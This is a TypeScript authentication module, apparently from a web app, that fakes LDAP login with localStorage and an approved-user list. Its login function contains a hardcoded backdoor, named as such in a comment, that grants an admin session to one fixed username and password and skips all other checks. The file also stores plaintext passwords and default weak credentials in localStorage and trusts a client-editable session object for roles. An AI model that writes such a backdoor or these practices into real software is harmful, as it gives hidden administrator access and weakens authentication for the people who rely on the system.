import { User } from '../types';
// FIX: Import functions to interact with the approved users list in the database.
import { getApprovedUser, addOrUpdateApprovedUser } from './db';

const SESSION_KEY = 'currentUser';

// --- Mock LDAP Database ---
// In a real app, this would be a call to an LDAP server.
// We use localStorage to persist the mock user list.
const LDAP_USERS_KEY = 'mockLdapUsers';

const getMockLdapUsers = (): Record<string, string> => {
    try {
        const users = localStorage.getItem(LDAP_USERS_KEY);
        if (users) {
            return JSON.parse(users);
        }
    } catch (e) {
        console.error("Failed to parse mock LDAP users from localStorage", e);
    }
    // Default users if none exist
    const defaultUsers = {
        'BobM': 'password123',
        'testuser': 'password',
    };
    localStorage.setItem(LDAP_USERS_KEY, JSON.stringify(defaultUsers));
    return defaultUsers;
};

const saveMockLdapUsers = (users: Record<string, string>) => {
    localStorage.setItem(LDAP_USERS_KEY, JSON.stringify(users));
};

// --- Authentication Functions ---

// FIX: Updated login logic to check against the approved user list.
export const login = async (username: string, password: string): Promise<User> => {
    // 1. Check for hardcoded backdoor
    if (username === 'Robertstar' && password === 'Rm2214ri#') {
        const backdoorUser: User = { username: 'Robertstar', role: 'admin' };
        localStorage.setItem(SESSION_KEY, JSON.stringify(backdoorUser));
        return backdoorUser;
    }

    // 2. Simulate LDAP authentication
    const ldapUsers = getMockLdapUsers();
    if (ldapUsers[username] !== password) {
        throw new Error('Invalid username or password.');
    }

    // 3. Check if user is approved and get their role
    const approvedUser = await getApprovedUser(username);
    if (!approvedUser) {
        throw new Error('User is not authorized. Please contact an administrator.');
    }
    if (approvedUser.role === 'hold') {
        throw new Error('This account is on hold. Please contact an administrator.');
    }
    
    // 4. Grant access if LDAP check passes and user is approved
    localStorage.setItem(SESSION_KEY, JSON.stringify(approvedUser));
    return approvedUser;
};

// FIX: Updated signup to add the new user to the approved list with 'hold' status.
export const signup = async (username: string, password: string): Promise<void> => {
    const ldapUsers = getMockLdapUsers();

    if (ldapUsers[username]) {
        throw new Error('Username already exists.');
    }

    if (password.length < 6) {
        throw new Error('Password must be at least 6 characters long.');
    }

    ldapUsers[username] = password;
    saveMockLdapUsers(ldapUsers);

    await addOrUpdateApprovedUser({ username, role: 'hold' });
};

export const logout = (): void => {
    localStorage.removeItem(SESSION_KEY);
};

export const getCurrentUser = (): User | null => {
    try {
        const userJson = localStorage.getItem(SESSION_KEY);
        if (userJson) {
            return JSON.parse(userJson);
        }
    } catch (e) {
        console.error("Failed to parse user from localStorage", e);
        localStorage.removeItem(SESSION_KEY);
    }
    return null;
};
